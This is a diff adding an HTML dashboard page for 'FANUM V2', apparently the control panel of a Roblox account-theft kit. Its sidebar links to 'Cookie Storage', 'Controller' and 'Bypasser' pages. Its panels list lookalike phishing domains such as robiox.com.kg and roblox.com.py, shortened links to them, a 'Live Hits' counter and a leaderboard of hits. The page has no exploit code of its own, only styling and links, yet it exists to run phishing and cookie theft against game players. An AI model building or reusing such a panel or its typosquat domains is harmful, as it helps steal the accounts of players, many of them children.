@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard-page</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to bottom right, #1c0033, #3d0066);
+            color: white;
+            display: flex;
+        }
+        .sidebar {
+            width: 250px;
+            height: 100vh;
+            background: rgba(50, 0, 70, 0.8);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            border-right: 3px solid rgba(255, 255, 255, 0.1);
+            transition: 0.3s ease-in-out;
+        }
+        .sidebar:hover {
+            box-shadow: 0 0 15px rgba(255, 0, 255, 0.7);
+            transform: scale(1.02);
+        }
+        .sidebar h1 {
+            color: #e066ff;
+            font-size: 24px;
+            text-shadow: 0 0 10px #e066ff;
+        }
+        .sidebar ul {
+            list-style: none;
+            padding: 0;
+        }
+        .sidebar ul li {
+            padding: 10px;
+            margin: 5px 0;
+            cursor: pointer;
+            color: white;
+            border: 2px solid #c71585;
+            border-radius: 5px;
+            text-align: center;
+            font-weight: bold;
+            transition: 0.3s ease-in-out;
+        }
+        .sidebar ul li:hover {
+            background: rgba(255, 20, 147, 0.2);
+            box-shadow: 0 0 15px #ff69b4;
+            transform: scale(1.1);
+            color: cyan;
+        }
+        .content {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: row;
+            justify-content: space-around;
+            padding: 40px 20px 20px;
+            gap: 20px;
+        }
+        .panel {
+            background: rgba(20, 0, 40, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 30%;
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.8);
+            border: 3px solid rgba(75, 0, 130, 0.8);
+            transition: 0.3s ease-in-out;
+        }
+        .panel:hover {
+            box-shadow: 0 0 25px rgba(148, 0, 211, 1);
+            transform: scale(1.05);
+        }
+        .button {
+            background: linear-gradient(to right, #8a2be2, #ff00ff);
+            color: white;
+            padding: 10px 15px;
+            border: 2px solid white;
+            cursor: pointer;
+            border-radius: 5px;
+            display: block;
+            margin: 10px auto;
+            width: 80%;
+            text-decoration: none;
+            text-align: center;
+            font-weight: bold;
+            transition: 0.3s ease-in-out;
+        }
+        .button:hover {
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.9);
+            transform: scale(1.1);
+        }
+        .button.red {
+            background: linear-gradient(to right, #ff1493, #c71585);
+        }
+        .leaderboard-item {
+            font-size: 16px;
+            font-weight: bold;
+            text-shadow: 0 0 5px violet, 0 0 10px violet, 0 0 15px violet;
+            padding: 10px 0;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+            transition: 0.3s ease-in-out;
+        }
+        .leaderboard-item:last-child {
+            border-bottom: none;
+        }
+        .leaderboard-item:hover {
+            text-shadow: 0 0 10px violet, 0 0 20px violet, 0 0 30px violet;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <h1>FANUM V2</h1>
+        <ul>
+            <li onclick="location.href='controller.html'">Controller</li>
+            <li onclick="location.href='cookiestorage.html'">Cookie Storage</li>
+            <li onclick="location.href='hyperlink.html'">Hyperlink</li>
+            <li onclick="location.href='settings.html'">Settings</li>
+            <li onclick="location.href='bypasser.html'">Bypasser [EXCLUSIVE ⭐]</li>
+        </ul>
+    </div>
+    <div class="content">
+        <div class="panel">
+            <h2>Available Domains</h2>
+            <a href="https://shorturl.at/bEUMs" class="button" target="_blank">MAIN SITE!</a>
+            <a href="https://spoo.me/fXZb80" class="button" target="_blank">robiox.com.kg</a>
+            <a href="https:/roblox.com.py/create/FaNumv2l/generator" class="button red" target="_blank">roblox.com.py</a>
+        </div>
+        <div class="panel">
+            <h2>Live Hits [UTC +8]</h2>
+            <button class="button red">Live Visitors</button>
+        </div>
+        <div class="panel">
+            <h2>Leaderboards (GLOBAL)</h2>
+            <p class="leaderboard-item">1.  - 0</p>
+            <p class="leaderboard-item">2.  - 0</p>
+            <p class="leaderboard-item">3.  - 0</p>
+            <p class="leaderboard-item">4.  - 0</p>
+            <p class="leaderboard-item">5.  - 0</p>
+            <p class="leaderboard-item">6.  - 0</p>
+            <p class="leaderboard-item">7.  - 0</p>
+            <p class="leaderboard-item">8.  - 0</p>
+            <p class="leaderboard-item">9.  - 0</p>
+            <p class="leaderboard-item">10. - 0</p>
+        </div>
+    </div>
+</body>
+</html>
